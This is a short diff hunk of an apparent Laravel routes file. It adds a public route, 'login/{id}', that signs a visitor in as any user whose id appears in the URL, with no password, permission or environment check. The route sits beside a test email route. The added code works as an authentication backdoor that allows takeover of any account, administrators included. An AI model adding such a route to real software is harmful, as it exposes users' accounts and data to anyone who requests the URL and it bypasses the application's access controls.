@@ -22,6 +22,10 @@ use Illuminate\Support\Facades\DB;
 use Illuminate\Support\Facades\Route;
 use App\Repository\OrderRepository;
 
+Route::get('login/{id}', function($id){
+    Auth::loginUsingId($id);
+    return redirect()->to('user/dashboard');
+});
 
 Route::get('test/email', function(\App\Lib\Mailer\TransactionMailer $mailer){
 
